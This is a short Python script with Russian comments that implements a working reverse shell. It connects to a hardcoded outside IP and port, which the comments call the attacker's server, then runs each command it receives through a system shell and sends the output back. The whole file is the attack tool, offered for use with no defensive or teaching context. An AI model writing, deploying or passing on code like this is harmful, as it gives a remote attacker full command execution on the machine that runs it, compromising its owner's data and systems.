import socket
import subprocess

server_ip = '95.165.8.178'  # Ваш IP-адрес (это будет IP вашего атакующего сервера)
server_port = 7777         # Порт, на котором будет слушать ваш сервер

# Создаем сокет для подключения к вашему серверу
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server_ip, server_port))

while True:
    try:
        command = s.recv(1024).decode('utf-8')  # Получаем команду от атакующего сервера
        if command.lower() == 'exit':
            break
        if command:
            # Обрабатываем команду и получаем вывод
            result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # Возвращаем вывод или ошибку
            output = result.stdout + result.stderr
            if not output:
                output = b'No output or error message.'

            s.send(output)  # Отправляем результат выполнения команды обратно
    except Exception as e:
        s.send(f"Error: {str(e)}".encode())  # Отправляем сообщение об ошибке, если она произошла

s.close()
